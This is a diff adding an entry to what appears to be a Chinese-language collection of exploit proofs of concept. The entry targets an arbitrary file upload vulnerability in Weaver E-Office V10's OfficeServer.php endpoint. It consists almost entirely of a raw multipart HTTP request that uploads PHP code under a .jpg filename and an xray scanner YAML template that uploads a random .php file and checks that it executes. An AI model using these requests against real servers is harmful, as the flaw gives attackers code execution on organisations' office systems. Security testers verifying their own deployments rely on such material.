@@ -465,3 +465,68 @@ Accept: */*
 Connection: Keep-Alive
 ```
 
+## 泛微OA E-Office V10 OfficeServer 任意文件上传漏洞
+
+原文连接：https://www.fiversec.com/posts/e99786b9.html
+
+```
+POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 395
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+Accept-Encoding: gzip, deflate
+Connection: close
+
+------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+Content-Type: image/jpeg
+
+<?php phpinfo();unlink(__FILE__);?>
+------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+Content-Disposition: form-data; name="FormData"
+
+{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test12.php'}
+------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
+
+# xray poc
+name: poc-yaml-eweaver-eoffice-v10-officeserver-upload
+manual: true
+transport: http
+set:
+    r1: randomInt(8000, 10000)
+    r2: randomLowercase(6)
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+            body: "\
+                ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n\
+                Content-Disposition: form-data; name=\"FileData\"; filename=\"1.jpg\"\r\n\
+                Content-Type: image/jpeg\r\n\
+                \r\n\
+                <?php echo md5({{r1}});unlink(__FILE__);?>\r\n\
+                ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n\
+                Content-Disposition: form-data; name=\"FormData\"\r\n\
+                \r\n\
+                {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{r2}}.php'}\r\n\
+                ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--\r\n\
+                "
+        expression: response.status == 200
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /eoffice10/server/public/iWebOffice2015/Document/{{r2}}.php
+        expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+expression: r1() && r2()
+detail:
+    author: IMF5er
+    links:
+        - https://mp.weixin.qq.com/s/arBSXR1uyfMT4UEr16Yw-A
+```
+
